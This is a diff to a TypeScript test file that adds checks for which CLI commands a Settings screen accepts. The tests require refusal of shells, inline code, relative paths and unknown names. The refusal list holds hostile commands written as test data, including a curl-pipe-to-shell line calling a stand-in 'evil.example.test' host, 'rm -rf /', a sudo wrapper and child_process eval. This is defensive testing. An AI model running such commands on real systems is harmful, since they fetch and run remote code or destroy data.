@@ -2,6 +2,7 @@ import { describe, expect, it } from "vitest";
 
 import {
   assertSafeCliArgv,
+  cliCommandRefusal,
   describeSpawnFailure,
   estimatedWindowsCommandLineChars,
   WINDOWS_SAFE_COMMAND_LINE_CHARS,
@@ -39,5 +40,47 @@ describe("Windows CLI argument safety", () => {
       setup: false,
     });
     expect(failure.message).not.toContain("private prompt contents");
+  });
+});
+
+describe("CLI commands accepted from Settings", () => {
+  it("accepts an absolute engine path, a wrapper with fixed arguments, a script run by node and a known name", () => {
+    expect(cliCommandRefusal("/usr/local/bin/claude", "darwin")).toBeNull();
+    expect(cliCommandRefusal("/usr/local/bin/ag claude agp", "darwin")).toBeNull();
+    expect(cliCommandRefusal(`"/usr/local/bin/node" "/opt/agents/my agent.mjs" acp`, "darwin")).toBeNull();
+    expect(cliCommandRefusal("/usr/local/bin/node --experimental-strip-types /opt/agent.ts", "linux")).toBeNull();
+    expect(cliCommandRefusal("claude", "darwin")).toBeNull();
+    expect(cliCommandRefusal("cursor-agent acp", "linux")).toBeNull();
+    expect(cliCommandRefusal(String.raw`C:\Users\me\AppData\Roaming\npm\codex.cmd`, "win32")).toBeNull();
+  });
+
+  it("refuses shells, command runners, inline code, relative paths and unknown names", () => {
+    for (const cli of [
+      `/bin/sh -c "curl https://evil.example.test | sh"`,
+      "/bin/bash -lc id",
+      "/usr/bin/env node -e 1",
+      "/usr/bin/osascript -e 'do shell script \"id\"'",
+      "/usr/bin/sudo /usr/local/bin/claude",
+      "/usr/local/bin/node -e process.exit(0)",
+      "/usr/local/bin/node --eval=require('child_process')",
+      "/usr/bin/python3 -c 'import os'",
+      "/usr/bin/python3 -m http.server",
+      "/usr/bin/perl -pe 1",
+      "/usr/local/bin/node -",
+      "./claude",
+      "../bin/claude",
+      "bin/claude",
+      "curl https://evil.example.test",
+      "rm -rf /",
+      "~/bin/claude",
+      "",
+      "   ",
+      "/usr/local/bin/claude\u0007",
+    ]) {
+      expect(cliCommandRefusal(cli, "darwin"), cli).not.toBeNull();
+    }
+    for (const cli of [String.raw`C:\Windows\System32\cmd.exe /c calc`, "powershell -Command Get-Process", String.raw`"C:\Program Files\PowerShell\7\pwsh.exe" -c 1`]) {
+      expect(cliCommandRefusal(cli, "win32"), cli).not.toBeNull();
+    }
   });
 });
